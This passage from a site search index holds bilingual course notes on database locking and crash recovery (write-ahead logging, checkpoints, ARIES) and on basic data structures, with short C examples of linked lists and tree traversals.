<li>\u7b2c\u4e00\u4e2a\u9501\u53ef\u4ee5\u653e\u5728\u4efb\u610f\u4f4d\u7f6e\uff0c\u540e\u7eed\u7684\u9501\u5fc5\u987b\u5728\u7236\u8282\u70b9\u9501\u4e0a\u65f6\u624d\u80fd\u4e0a\u9501</li> <li>\u53ef\u4ee5\u5728\u4efb\u610f\u65f6\u523b\u91ca\u653e\u9501</li> <li>\u91ca\u653e\u9501\u540e\u4e0d\u80fd\u518d\u4e0a\u9501</li> </ul> <p>\u6ca1\u6709\u6b7b\u9501\uff0c\u51b2\u7a81\u53ef\u4e32\u884c\u5316\u3002\u4e0d\u80fd\u4fdd\u8bc1\u53ef\u6062\u590d\u6027\u3002</p>"},{"location":"cs/database/review/#multiple-granularity","title":"Multiple Granularity","text":"<p>\u53ef\u4ee5\u5bf9\u8bb0\u5f55\u4e0a\u9501\uff0c\u4e5f\u53ef\u4ee5\u5bf9\u8868\u4e0a\u9501\u3002\u9501\u53ef\u4ee5\u52a0\u5728\uff1a</p> <ul> <li>database</li> <li>area</li> <li>table</li> <li>record</li> </ul>"},{"location":"cs/database/review/#intention-lock-mode","title":"Intention Lock Mode","text":"<p>\u610f\u5411\u9501</p> <ul> <li>\u5982\u679c\u8bb0\u5f55\u4e0a\u52a0 X \u9501\uff0c\u90a3\u4e48\u5728\u8868\u4e0a\u8981\u52a0\u610f\u5411\u6392\u4ed6\u9501 IX</li> <li>\u5982\u679c\u8bb0\u5f55\u4e0a\u52a0 S \u9501\uff0c\u90a3\u4e48\u5728\u8868\u4e0a\u8981\u52a0\u610f\u5411\u6392\u4ed6\u9501 IS</li> <li>\u5982\u679c\u8868\u4e2d\u8bb0\u5f55\u6709 X \u9501\uff0c\u4f46\u662f\u8981\u5bf9\u8868\u4e0a S \u9501\uff0c\u90a3\u4e48\u8981\u52a0\u5171\u4eab\u610f\u5411\u6392\u4ed6\u9501 SIX</li> </ul> <p>\u76f8\u5bb9\u8868\uff1a</p> IS IX S SIX X IS T T T T F IX T T F F F S T F T F F SIX T F F F F X F F F F F"},{"location":"cs/database/review/#recovery-system","title":"Recovery System","text":""},{"location":"cs/database/review/#failure-classification","title":"Failure Classification","text":"<ul> <li>Transaction failure\uff1a\u4e8b\u52a1\u6267\u884c\u5931\u8d25\uff0c\u5e38\u7528\u65b9\u6cd5 undo</li> <li>System crash\uff1a\u7cfb\u7edf\u5d29\u6e83\uff0c\u5df2\u7ecf\u63d0\u4ea4\u7684\u4e8b\u52a1\u8981 redo\uff0c\u672a\u63d0\u4ea4\u7684\u4e8b\u52a1\u8981 undo</li> <li>Disk failure\uff1a\u4ecb\u8d28\u6545\u969c\uff0c\u8981\u8fdb\u884c\u5907\u4efd</li> </ul> <p>\u8981\u5c06\u65e5\u5fd7\u5199\u5165 stable storage\uff0c\u4fdd\u8bc1\u5373\u4f7f\u7cfb\u7edf\u5d29\u6e83\uff0c\u65e5\u5fd7\u4e5f\u4e0d\u4f1a\u4e22\u5931\u3002</p>"},{"location":"cs/database/review/#log-records","title":"Log Records","text":"<ul> <li><code>&lt;Ti start&gt;</code> \u4e8b\u52a1\u5f00\u59cb</li> <li><code>&lt;Ti X V1 V2&gt;</code> \u4e8b\u52a1 \\(T_i\\) \u5bf9 \\(X\\) \u4ece \\(V_1\\) \u4fee\u6539\u4e3a \\(V_2\\)</li> <li><code>&lt;Ti commit&gt;</code> \u4e8b\u52a1\u63d0\u4ea4</li> <li><code>&lt;Ti abort&gt;</code> \u4e8b\u52a1\u56de\u6eda</li> <li><code>&lt;Ti X V&gt;</code> \u4e8b\u52a1 \\(T_i\\) \u5bf9 \\(X\\) \u4fee\u6539\u4e3a \\(V\\)\uff0c\u7528\u4e8e\u56de\u6eda</li> </ul>"},{"location":"cs/database/review/#write-ahead-logging","title":"Write-ahead Logging","text":"<p>\u5148\u5199\u65e5\u5fd7\u539f\u5219\u3002\u6570\u636e\u4fee\u6539\u4e4b\u524d\uff0c\u548c\u6570\u636e\u6709\u5173\u7684\u8bb0\u5f55\u8981\u5148\u5199\u5165\u65e5\u5fd7\u3002</p>"},{"location":"cs/database/review/#transaction-commit","title":"Transaction Commit","text":"<p>\u65e5\u5fd7\u5199\u5165\u4ee3\u8868\u4e8b\u52a1\u63d0\u4ea4\uff0c\u5177\u4f53\u6570\u636e\u4e0d\u4e00\u5b9a\u5199\u5165\u78c1\u76d8\u3002</p>"},{"location":"cs/database/review/#checkpoint","title":"Checkpoint","text":"<p>\u91cd\u6f14\u65f6\uff0c\u4ece\u6700\u8fd1\u7684 checkpoint \u5f00\u59cb\u91cd\u6f14\u3002\u751f\u6210 checkpoint \u8fc7\u7a0b\uff1a</p> <ol> <li>\u65e5\u5fd7\u4ece\u5185\u5b58\u4e2d\u5199\u5165 stable storage</li> <li>\u628a buffer \u4e2d\u7684\u6570\u636e\u5168\u90e8\u5199\u5165\u78c1\u76d8</li> <li>\u5199\u4e00\u884c\u65e5\u5fd7 <code>&lt;checkpoint L&gt;</code>\uff0cL \u4e3a\u6d3b\u8dc3\u4e8b\u52a1\u8868</li> <li>\u751f\u6210 checkpoint \u65f6\u6240\u6709\u5176\u4ed6\u4e8b\u52a1\u90fd\u4f1a\u6682\u505c</li> </ol> <p>\u6839\u636e\u65e5\u5fd7\u91cf\u51b3\u5b9a\u4f55\u65f6\u751f\u6210 checkpoint\u3002</p>"},{"location":"cs/database/review/#log-record-buffering","title":"Log Record Buffering","text":"<p>\u5c06\u6570\u636e buffer \u4e2d\u7684\u5757\u5199\u5165\u78c1\u76d8\u65f6\uff0c\u8981\u5148\u5c06\u5bf9\u5e94\u7684\u65e5\u5fd7\u5199\u5165\u78c1\u76d8\u3002</p> <ul> <li>no-force policy: \u4e8b\u52a1 commit \u4e86\u4f46\u4e0d\u5f3a\u5236\u65e5\u5fd7\u5199\u5165\u78c1\u76d8</li> <li>steal policy: \u4e8b\u52a1\u672a commit \u4f46\u662f\u80fd\u5c06\u810f\u6570\u636e\u5199\u5165\u78c1\u76d8\uff08\u540c\u65f6\u5bf9\u5e94\u65e5\u5fd7\u4e5f\u5199\u5165\u78c1\u76d8\uff09</li> </ul>"},{"location":"cs/database/review/#fuzzy-checkpoint","title":"Fuzzy Checkpoint","text":"<p>\u505a checkpoint \u65f6\uff0c\u4e0d\u4e00\u6b21\u5c06\u6240\u6709\u810f\u6570\u636e\u5199\u5165\u78c1\u76d8\u3002\u800c\u662f\u8bb0\u5f55\u810f\u6570\u636e\u4f4d\u7f6e\uff0c\u5728\u4e4b\u540e\u6162\u6162\u5199\u5165\uff0c\u5f53\u810f\u6570\u636e\u5168\u90e8\u5199\u5165\u540e\uff0c\u518d\u8ba4\u5b9a\u8be5 checkpoint \u6709\u6548\u3002</p>"},{"location":"cs/database/review/#failure-with-loss-of-nonvolatile-storage","title":"Failure with Loss of Nonvolatile Storage","text":"<p>\u5982\u679c\u53d1\u751f\u4e86\u4ecb\u8d28\u6545\u969c\uff0c\u8981\u8fdb\u884c\u6062\u590d\u3002\u57fa\u672c\u64cd\u4f5c\u662f\u505a backup\u3002</p> <p>\u53d1\u751f\u6545\u969c\u65f6\u505a\u5feb\u7167\uff0c\u7136\u540e\u6162\u6162\u5907\u4efd\u3002</p>"},{"location":"cs/database/review/#aries-recovery-algorithm","title":"ARIES Recovery Algorithm","text":"<ul> <li>LSN\uff1alog sequence number\uff0c\u65e5\u5fd7\u5e8f\u5217\u53f7\u3002</li> <li>Page LSN\uff1a\u6bcf\u4e00\u4e2a\u6570\u636e\u5757\u8bb0\u5f55\u4e00\u4e2a LSN\uff0c\u8bb0\u5f55\u8fd9\u4e2a\u5757\u53cd\u6620\u4e86\u6700\u8fd1\u65e5\u5fd7\u7684\u4fee\u6539\u7ed3\u679c</li> <li>Dirty Page Table\uff1a\u8bb0\u5f55 checkpoint \u65f6\u7684\u810f\u6570\u636e\u5757<ul> <li>\u8bb0\u5f55 PageLSN \u548c RecLSN\uff0cRecLSN \u4ee3\u8868\u4ece\u6b64 LSN \u5f00\u59cb\u7684\u65e5\u5fd7\u8bb0\u5f55\u90fd\u6ca1\u6709\u53cd\u6620\u5230\u78c1\u76d8\u4e0a\uff08\u5373\u54ea\u6761\u65e5\u5fd7\u8bb0\u5f55\u5bfc\u81f4\u4e86\u8fd9\u4e2a\u810f\u6570\u636e\u5757\uff09</li> </ul> </li> </ul>"},{"location":"cs/database/review/#recovery-process","title":"Recovery Process","text":"<ol> <li>Analysis\uff1a\u5206\u6790\u65e5\u5fd7\uff0c\u627e\u5230\u6700\u8fd1\u7684 checkpoint<ul> <li>undo-list\uff1a\u5f97\u5230\u54ea\u4e9b\u4e8b\u52a1\u9700\u8981\u56de\u6eda\uff0c\u6839\u636e\u6d3b\u8dc3\u4e8b\u52a1\u8868\uff0c\u518d\u6839\u636e\u65e5\u5fd7\u627e\u5230\u54ea\u4e9b\u4e8b\u52a1\u9700\u8981\u56de\u6eda</li> <li>dirty page table\uff1a\u5f97\u5230\u6700\u65b0\u7684 dirty page table</li> <li>redoLSN\uff1aredo \u9700\u8981\u4ece\u54ea\u6761\u65e5\u5fd7\u5f00\u59cb\uff0c\u53ef\u80fd\u5728 checkpoint \u4e4b\u524d\uff0cdirty page table \u4e2d RecLSN \u7684\u6700\u5c0f\u503c</li> </ul> </li> <li>Redo\uff1a\u91cd\u6f14\u65e5\u5fd7\uff1a\u4ece redoLSN \u5f00\u59cb\uff0c\u91cd\u6f14\u65e5\u5fd7</li> <li>Undo\uff1a\u56de\u6eda\u4e8b\u52a1\uff1a\u6839\u636e undo-list \u56de\u6eda\u4e8b\u52a1</li> </ol>"},{"location":"cs/fds/","title":"\u6570\u636e\u7ed3\u6784\u57fa\u7840","text":"<p>Info</p> <p>\u672c\u6587\u6863\u4e3a\u6570\u636e\u7ed3\u6784\u57fa\u7840\u7684\u5b66\u4e60\u7b14\u8bb0\uff0c\u6388\u8bfe\u6559\u5e08\u4e3a \u6768\u5b50\u797a \u3002</p> <ul> <li>Algorithm Analysis</li> <li>Lists, Stacks and Queues</li> <li>Trees<ul> <li>Binary Trees</li> <li>Sreach Tree</li> <li>Priority Queue</li> </ul> </li> <li>Union and Find</li> <li>Graph<ul> <li>Topological Sort</li> <li>Shortest Path</li> <li>Network Flow</li> <li>MST</li> <li>DFS</li> </ul> </li> <li>Sorting</li> <li>Hashing</li> </ul>"},{"location":"cs/fds/chapter1/","title":"Agorithm Analysis","text":""},{"location":"cs/fds/chapter1/#definition-of-algorithm","title":"Definition of Algorithm","text":"<p>All algorithms must satisfy the following criteria:</p> <ul> <li>Input: zero or more externally supplied values \u5916\u90e8\u63d0\u4f9b\u7684\u8f93\u5165</li> <li>Output: at least one value \u4e00\u4e2a\u6216\u591a\u4e2a\u8f93\u51fa</li> <li>Definiteness: each instruction must be clear and unambiguous \u6bcf\u6761\u6307\u4ee4\u90fd\u5fc5\u987b\u6e05\u6670\u660e\u786e</li> <li>Finiteness: if we trace out the instructions of an algorithm, then for all cases the algorithm will terminate after a finite number of steps \u5bf9\u4e8e\u6240\u6709\u60c5\u51b5\uff0c\u7b97\u6cd5\u5c06\u5728\u6709\u9650\u6b65\u9aa4\u540e\u7ec8\u6b62</li> <li>Effectiveness: every instruction must be basic enough to be carried out \u6bcf\u6761\u6307\u4ee4\u90fd\u5fc5\u987b\u8db3\u591f\u57fa\u672c\uff0c\u80fd\u591f\u88ab\u8ba1\u7b97\u673a\u6267\u884c</li> </ul> <p>program</p> <p>A program is written in some programming language, and does not have to be finite.</p> <p>\u7a0b\u5e8f\u662f\u7528\u67d0\u79cd\u7f16\u7a0b\u8bed\u8a00\u7f16\u5199\u7684\uff0c\u4e0d\u4e00\u5b9a\u6709\u9650\u3002</p>"},{"location":"cs/fds/chapter1/#algorithm-analysis","title":"Algorithm Analysis","text":""},{"location":"cs/fds/chapter1/#_1","title":"\u5206\u6790\u5185\u5bb9","text":"<ul> <li>run times\uff1a\u8fd0\u884c\u65f6\u95f4</li> <li>time and space complexity\uff1a\u65f6\u95f4\u548c\u7a7a\u95f4\u590d\u6742\u5ea6</li> </ul> <p>\u4e00\u822c\u5206\u6790 \\(T_{avg}(N)\\) \u548c \\(T_{worst}(N)\\) \uff0c\u5373\u5e73\u5747\u65f6\u95f4\u590d\u6742\u5ea6\u548c\u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6\u3002</p>"},{"location":"cs/fds/chapter1/#asymptotic-notation","title":"Asymptotic Notation","text":"<ul> <li>\\(T(N) = O(f(N)) \\Rightarrow T(N) \\leq cf(N)\\)</li> <li>\\(T(N) = \\Omega(f(N)) \\Rightarrow T(N) \\geq cf(N)\\)</li> <li>\\(T(N) = \\Theta(f(N)) \\Rightarrow T(N) = O(f(N)) \\land T(N) = \\Omega(f(N))\\)</li> <li>\\(T(N) = o(f(N)) \\Rightarrow T(N) = O(f(N)) \\land T(N) \\neq \\Omega(f(N))\\)</li> </ul> <p>Rules:</p> <ul> <li>\u5982\u679c \\(T_1(N) = O(f(N))\\) \u4e14 \\(T_2(N) = O(g(N))\\) \uff0c\u5219<ul> <li>\\(T_1(N) + T_2(N) = \\max(O(f(N)), O(g(N)))\\)</li> <li>\\(T_1(N) \\cdot T_2(N) = O(f(N) \\cdot g(N))\\)</li> </ul> </li> <li>\u5982\u679c \\(T(N)\\) \u662f\u4e00\u4e2a \\(k\\) \u6b21\u591a\u9879\u5f0f\uff0c\u5219 \\(T(N) = \\Theta(N^k)\\)</li> <li>\\(\\log_k N = O(N)\\)\uff0clogarithms grow very slowly \u5bf9\u6570\u589e\u957f\u975e\u5e38\u7f13\u6162</li> </ul>"},{"location":"cs/fds/chapter1/#logarithms","title":"Logarithms","text":"<p>Eucild's Algorithm</p> <pre><code>int gcd(int a, int b) {\n    if (b == 0) return a;\n    else return gcd(b, a%b);\n}\n</code></pre> <p>Expontentiation \u5feb\u901f\u5e42</p> <p>\u9012\u5f52\u7248\u672c\uff08\u65e0\u8bb0\u5fc6\u5316\uff09\uff1a</p> <pre><code>int mypow(int a, int b) {\n    if (b == 0) return 1;\n    else if (b &amp; 1) return a * mypow(a, b-1);\n    else return mypow(a, b/2) * mypow(a, b/2);\n}\n</code></pre> <p>\u8fed\u4ee3\u7248\u672c\uff1a</p> <pre><code>int mypow(int a, int b) {\n    int res = 1;\n    while (b) {\n        if (b &amp; 1) res *= a;\n        a *= a;\n        b &gt;&gt;= 1;\n    }\n    return res;\n}\n</code></pre>"},{"location":"cs/fds/chapter1/#checking-analysis","title":"Checking Analysis","text":"<ul> <li> <p>\u82e5 \\(T(N) = O(N^k)\\) \uff0c\u5219\u6709</p> \\[\\frac{T(2N)}{T(N)} \\approx 2^k\\] </li> <li> <p>\u82e5 \\(T(N) = O(f(N))\\) \uff0c\u5219\u6709</p> \\[\\lim_{N \\to \\infty} \\frac{T(N)}{f(N)} = constant\\] </li> </ul>"},{"location":"cs/fds/chapter1/#_2","title":"\u9519\u9898\u6574\u7406","text":"<p>Question 1</p> <p>The recurrent equations for the time complexities of programs P1 and P2 are:</p> <ul> <li>P1: \\(T(1)=1,T(N)=T(N/3)+1\\)</li> <li>P2: \\(T(1)=1,T(N)=3T(N/3)+1\\)</li> </ul> <p>Then the correct conclusion about their time complexities is ______</p> <p>Answer</p> <ul> <li> <p>P1: </p> \\[ \\begin{aligned} T(N) &amp;= T(N/3) + 1 \\\\ &amp;= T(N/9) + 2 \\\\ &amp;= T(1) + \\log_3 N \\\\ &amp;= O(\\log_3 N) \\end{aligned} \\] </li> <li> <p>P2:</p> \\[ \\begin{aligned} T(N) &amp;= 3T(N/3) + 1 \\\\ &amp;= 9T(N/9) + 3 + 1 \\\\ &amp;= 3^{\\left\\lfloor \\log_3 N \\right\\rfloor} T(1) + 3^{\\left\\lfloor \\log_3 N \\right\\rfloor - 1} + \\cdots + 3^0 \\\\ &amp;= O(N)  \\end{aligned}    \\] </li> </ul>"},{"location":"cs/fds/chapter2/","title":"Lists, Stacks and Queues","text":""},{"location":"cs/fds/chapter2/#abstract-data-type-adt","title":"Abstract Data Type (ADT)","text":"<p>Definition: \\(\\text{Data Type} = \\{\\text{Objects}\\} \\cup \\{\\text{Operations}\\}\\)</p> <p>\u5c06\u6570\u636e\u5b9a\u4e49\u4e3a\u62bd\u8c61\u7684\u5bf9\u8c61\u96c6\u5408\uff0c\u4e0d\u8003\u8651 object \u548c operation \u5185\u90e8\u5177\u4f53\u5b9e\u73b0\u7ec6\u8282\u3002</p>"},{"location":"cs/fds/chapter2/#the-list-adt","title":"The List ADT","text":""},{"location":"cs/fds/chapter2/#adt","title":"ADT","text":"<ul> <li>Objects: \\((\\text{item}_0, \\text{item}_1, \\cdots, \\text{item}_{N-1})\\)</li> <li>Operations: Find length, Print, Make empty list, Find k-th, Insert, Delete, ...</li> </ul>"},{"location":"cs/fds/chapter2/#array-implementation","title":"Array Implementation","text":"<p>\\(\\text{array}[i] = \\text{item}_i\\)</p> <ul> <li>MaxSize: has to be estimate \u9700\u8981\u9884\u4f30\u6700\u5927\u957f\u5ea6</li> <li>Find k-th: \\(O(1)\\)</li> <li>Insert and Delete: \\(O(N)\\)</li> </ul>"},{"location":"cs/fds/chapter2/#linked-list","title":"Linked List","text":"<ul> <li> <p>Insert:</p> <p><pre><code>// Insert x after p\nnewnode = malloc(sizeof(struct Node));\nnewnode-&gt;item = x;\nnewnode-&gt;next = p-&gt;next;\np-&gt;next = newnode;\n</code></pre> - Delete:</p> <pre><code>// Delete node p-&gt;next\nq = p-&gt;next;\np-&gt;next = q-&gt;next;\nfree(q);\n</code></pre> </li> </ul> <p>Double Linked List</p> <pre><code>struct Node {\n    Item item;\n    struct Node *llink;\n    struct Node *rlink;\n};\n</code></pre>"},{"location":"cs/fds/chapter2/#applications","title":"Applications","text":""},{"location":"cs/fds/chapter2/#the-polynomial-adt","title":"The Polynomial ADT","text":"<p>Objects: pair \\(\\langle \\text{exponent}, \\text{coefficient} \\rangle\\)</p>"},{"location":"cs/fds/chapter2/#multilists","title":"Multilists","text":"<p>\u5b58\u50a8\u4e8c\u7ef4\u6570\u636e\u3002</p> <p>Linked List Matrix</p> <p>\u6bcf\u884c\u4e24\u4e2a\u94fe\u8868\u5b58\u50a8\u975e\u96f6\u5143\u7d20\u548c\u5217\u5730\u5740\u3002</p>"},{"location":"cs/fds/chapter2/#cursor-implementation","title":"Cursor Implementation","text":"<p>\u6e38\u6807\u5b9e\u73b0\uff0c\u5373\u6570\u7ec4\u6a21\u62df\u94fe\u8868\u3002</p>"},{"location":"cs/fds/chapter2/#the-stack-adt","title":"The Stack ADT","text":""},{"location":"cs/fds/chapter2/#adt_1","title":"ADT","text":"<p>LIFO: Last In First Out</p>"},{"location":"cs/fds/chapter2/#implimentation","title":"Implimentation","text":"<ul> <li>Linked List</li> <li>Array</li> </ul>"},{"location":"cs/fds/chapter2/#applications_1","title":"Applications","text":"<ul> <li>\u62ec\u53f7\u5339\u914d</li> <li>postfix evaluation \u540e\u7f00\u8868\u8fbe\u5f0f\u6c42\u503c</li> <li>infix to postfix \u4e2d\u7f00\u8868\u8fbe\u5f0f\u8f6c\u540e\u7f00\u8868\u8fbe\u5f0f</li> <li>Function calls \u51fd\u6570\u8c03\u7528\uff0c\u7cfb\u7edf\u6808</li> </ul>"},{"location":"cs/fds/chapter2/#the-queue-adt","title":"The Queue ADT","text":""},{"location":"cs/fds/chapter2/#adt_2","title":"ADT","text":"<p>FIFO: First In First Out</p>"},{"location":"cs/fds/chapter2/#implementation","title":"Implementation","text":"<p>Array Implementation</p> <p>Circular Queue</p> <p>\u82e5\u4e0d\u5b58\u50a8\u961f\u5217\u957f\u5ea6\uff0c\u5219\u65e0\u6cd5\u5224\u65ad\u961f\u5217\u4e3a\u7a7a\u8fd8\u662f\u6ee1\u3002</p> <p>\u4e00\u822c\u505a\u6cd5\u4e3a\u6d6a\u8d39\u4e00\u4e2a\u7a7a\u95f4\u6216\u8005\u5b58\u50a8\u961f\u5217\u957f\u5ea6\u3002</p>"},{"location":"cs/fds/chapter2/#_1","title":"\u9519\u9898\u6574\u7406","text":"<p>Question 1</p> <p>To merge two singly linked ascending lists, both with N nodes, into one singly linked ascending list, the minimum possible number of comparisons is ______.</p> <p>Answer</p> <p>\\(N\\)</p>"},{"location":"cs/fds/chapter3/","title":"Trees","text":""},{"location":"cs/fds/chapter3/#tree","title":"Tree","text":""},{"location":"cs/fds/chapter3/#definition","title":"Definition","text":"<p>A tree is a collection of nodes. The collection can be empty; otherwise, a tree consists of</p> <ul> <li>root</li> <li>zero or more subtrees, each of whose roots are connected by a directed edge from the root.</li> </ul> <p>\u6811\u53ef\u4ee5\u4e3a\u7a7a\u3002\u5982\u679c\u4e0d\u4e3a\u7a7a\uff0c\u6811\u7531\u6839\u8282\u70b9\u548c\u82e5\u5e72\u5b50\u6811\u7ec4\u6210\uff0c\u6bcf\u4e2a\u5b50\u6811\u7684\u6839\u8282\u70b9\u901a\u8fc7\u4e00\u6761\u4ece\u6839\u51fa\u53d1\u7684\u6709\u5411\u8fb9\u4e0e\u6839\u8282\u70b9\u76f8\u8fde\u3002</p> <p>\u6982\u5ff5\u5b9a\u4e49\uff1a</p> <ul> <li>degree of a node: the number of its children</li> <li>degree of a tree: \\(\\displaystyle\\max_{v \\in V} \\deg(v)\\)</li> <li>parent: a node that has subtrees</li> <li>child: the roots of subtrees of a parent</li> <li>sibling: nodes that have the same parent</li> <li>leaf(terminal node): a node that has no children</li> <li>path from \\(n_1\\) to \\(n_k\\): a sequence of nodes \\(n_1, n_2, \\dots, n_k\\) such that \\(n_i\\) is the parent of \\(n_{i+1}\\) for \\(i = 1, 2, \\dots, k-1\\) \u4ece\u4e0a\u5230\u4e0b\u7684\u8def\u5f84</li> <li>path length: the number of edges on the path</li> <li>depth of a node: the path length from the root to the node \\(n\\) \u4ece\u6839\u5230\u8282\u70b9\u7684\u8def\u5f84\u957f\u5ea6</li> <li>height of a node: the path length from the node \\(n\\) to the deepest leaf \u4ece\u8282\u70b9\u5230\u6700\u6df1\u53f6\u5b50\u7684\u8def\u5f84\u957f\u5ea6</li> <li>height(depth) of a tree: the height of the root \u6811\u7684\u9ad8\u5ea6</li> <li>ancestor: all the nodes along the path from the node up to the root \u4ece\u8282\u70b9\u5230\u6839\u7684\u8def\u5f84\u4e0a\u7684\u6240\u6709\u8282\u70b9</li> <li>descendant: all the nodes in the subtree</li> </ul>"},{"location":"cs/fds/chapter3/#implementation","title":"Implementation","text":""},{"location":"cs/fds/chapter3/#list-representation","title":"List Representation","text":"<pre><code>struct TreeNode {\n    ElementType Element;\n    PtrToNode LeftChild;\n    PtrToNode RightChild;\n};\n</code></pre>"},{"location":"cs/fds/chapter3/#first-child-next-sibling-representation","title":"First-Child Next-Sibling Representation","text":"<pre><code>struct TreeNode {\n    ElementType Element;\n    PtrToNode FirstChild;\n    PtrToNode NextSibling;\n};\n</code></pre>"},{"location":"cs/fds/chapter3/#binary-trees","title":"Binary Trees","text":""},{"location":"cs/fds/chapter3/#definition_1","title":"Definition","text":"<p>A binary tree is a tree in which no node can have more than two children.</p>"},{"location":"cs/fds/chapter3/#tree-traversals","title":"Tree Traversals","text":"<ul> <li> <p>Preorder</p> <pre><code>void preorder(PtrToNode T) {\n    if (T != NULL) {\n        visit(T);\n        preorder(T-&gt;LeftChild);\n        preorder(T-&gt;RightChild);\n    }\n}\n</code></pre> </li> <li> <p>Inorder</p> <pre><code>void inorder(PtrToNode T) {\n    if (T != NULL) {\n        inorder(T-&gt;LeftChild);\n        visit(T);\n        inorder(T-&gt;RightChild);\n    }\n}\n</code></pre> </li> <li> <p>Postorder</p> <pre><code>void postorder(PtrToNode T) {\n    if (T != NULL) {\n        postorder(T-&gt;LeftChild);\n        postorder(T-&gt;RightChild);\n        visit(T);\n    }\n}\n</code></pre> </li> <li> <p>Levelorder</p> <pre><code>void levelorder(PtrToNode T) {\n    enqueue(T);\n    while (!isEmpty()) {\n        T = dequeue();\n        visit(T);\n        if (T-&gt;LeftChild != NULL) enqueue(T-&gt;LeftChild);\n        if (T-&gt;RightChild != NULL) enqueue(T-&gt;RightChild);\n    }\n}\n</code></pre> </li> </ul>"},{"location":"cs/fds/chapter3/#threaded-binary-trees","title":"Threaded Binary Trees","text":"<p>\u4e8c\u53c9\u7ebf\u7d22\u6811\u3002\u5c06\u904d\u5386\u987a\u5e8f\u4fdd\u5b58\uff0c\u65b9\u4fbf\u4e4b\u540e\u7684\u904d\u5386\u3002</p> <p>Rules:</p> <ol> <li> <p>If a node has no left child, its left pointer points to its inorder predecessor.</p> <p>\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u6ca1\u6709\u5de6\u513f\u5b50\uff0c\u90a3\u4e48\u5b83\u7684\u5de6\u6307\u9488\u6307\u5411\u5b83\u7684\u4e2d\u5e8f\u524d\u9a71\u3002</p> </li> <li> <p>If a node has no right child, its right pointer points to its inorder successor.</p> <p>\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u6ca1\u6709\u53f3\u513f\u5b50\uff0c\u90a3\u4e48\u5b83\u7684\u53f3\u6307\u9488\u6307\u5411\u5b83\u7684\u4e2d\u5e8f\u540e\u7ee7\u3002</p> </li> <li> <p>\u9700\u8981\u589e\u52a0\u4e00\u4e2a head node\uff0c\u4f7f\u5f97 head-&gt;LeftChild \u6307\u5411\u6839\u8282\u70b9\uff0chead-&gt;RightChild \u6307\u5411\u81ea\u5df1\u3002</p> </li> </ol> <p>\u5efa\u7acb\u7ebf\u7d22\u4e8c\u53c9\u6811\uff1a</p> <pre><code>void ThreadTree(PtrToNode *p, PtrToNode **pre){\n    if(p == NULL) return;\n    ThreadTree(p-&gt;LeftChild, pre);\n    threadNode(p, pre);\n    ThreadTree(p-&gt;RightChild, pre);\n}\n</code></pre> <p>\u904d\u5386\u7ebf\u7d22\u4e8c\u53c9\u6811\uff1a</p> <pre><code>void InorderTraversal(PtrToNode T){\n    PtrToNode p = T-&gt;LeftChild;\n    while(p != T){\n        while(p-&gt;LeftTag == 0) p = p-&gt;LeftChild;\n        visit(p);\n        while(p-&gt;RightTag == 1 &amp;&amp; p-&gt;RightChild != T){\n            p = p-&gt;RightChild;\n            visit(p);\n        }\n        p = p-&gt;RightChild;\n    }\n}\n</code></pre>"},{"location":"cs/fds/chapter3/#properties-of-binary-trees","title":"Properties of Binary Trees","text":""},{"location":"cs/fds/chapter3/#_1","title":"\u5f62\u6001","text":"<ul> <li>full binary tree: every node has either zero or two children \u6bcf\u4e2a\u8282\u70b9\u90fd\u6709\u4e24\u4e2a\u5b50\u8282\u70b9\u6216\u8005\u6ca1\u6709\u5b50\u8282\u70b9</li> <li>complete binary tree: every level except possibly the last is completely filled, and all nodes in the last level are as far left as possible \u6bcf\u4e2a\u8282\u70b9\u90fd\u6709\u4e24\u4e2a\u5b50\u8282\u70b9\uff0c\u9664\u4e86\u6700\u540e\u4e00\u5c42\u7684\u8282\u70b9\uff0c\u6700\u540e\u4e00\u5c42\u7684\u8282\u70b9\u5c3d\u53ef\u80fd\u9760\u5de6</li> <li>perfect binary tree: a full binary tree in which all leaves are at the same level \u6bcf\u4e2a\u8282\u70b9\u90fd\u6709\u4e24\u4e2a\u5b50\u8282\u70b9\uff0c\u6240\u6709\u53f6\u5b50\u8282\u70b9\u90fd\u5728\u540c\u4e00\u5c42\u4e14\u586b\u6ee1\u6700\u540e\u4e00\u5c42</li> <li> <p>skewed binary tree: a binary tree in which all nodes have only one child \u6bcf\u4e2a\u8282\u70b9\u90fd\u53ea\u6709\u4e00\u4e2a\u5b50\u8282\u70b9 </p> <ul> <li>left skewed: every node has a left child, but no node has a right child \u6bcf\u4e2a\u8282\u70b9\u90fd\u6709\u5de6\u513f\u5b50\uff0c\u4f46\u662f\u6ca1\u6709\u53f3\u513f\u5b50</li> <li>right skewed: every node has a right child, but no node has a left child \u6bcf\u4e2a\u8282\u70b9\u90fd\u6709\u53f3\u513f\u5b50\uff0c\u4f46\u662f\u6ca1\u6709\u5de6\u513f\u5b50</li> </ul> </li> </ul>"},{"location":"cs/fds/chapter3/#_2","title":"\u6570\u91cf\u5173\u7cfb","text":"<ul> <li>level \\(i\\) \u7684\u8282\u70b9\u6570\u6700\u591a\u4e3a \\(2^{i-1}, \\quad i \\geq 1\\)</li> <li>depth \\(k\\) \u7684\u4e8c\u53c9\u6811\u6700\u591a\u6709 \\(2^k - 1\\) \u4e2a\u8282\u70b9\uff0c\u6700\u5c11\u6709 \\(k\\) \u4e2a\u8282\u70b9</li> <li>\u8bbe\u5ea6\u4e3a \\(\\deg\\) \u7684\u8282\u70b9\u603b\u6570\u4e3a \\(n_{\\deg}\\)\uff0c\u5219 \\(n_0 = n_2 + 1\\)</li> </ul>"},{"location":"cs/fds/chapter3/#the-search-tree-adt","title":"The Search Tree ADT","text":""},{"location":"cs/fds/chapter3/#definition_2","title":"Definition","text":"<p>\u5de6\u8282\u70b9\u7684\u503c\u5c0f\u4e8e\u6839\u8282\u70b9\uff0c\u53f3\u8282\u70b9\u7684\u503c\u5927\u4e8e\u6839\u8282\u70b9\u3002</p>"},{"location":"cs/fds/chapter3/#implementation_1","title":"Implementation","text":"<ul> <li>Find</li> <li>Insert</li> <li> <p>Delete</p> <ul> <li> <p>case 1: the node to be deleted is a leaf node</p> <p>\u76f4\u63a5\u5220\u9664</p> </li> <li> <p>case 2: the node to be deleted has only one child</p> <p>\u5c06\u5b50\u8282\u70b9\u63d0\u5347\u5230\u88ab\u5220\u9664\u8282\u70b9\u7684\u4f4d\u7f6e</p> </li> <li> <p>case 3: the node to be deleted has two children</p> 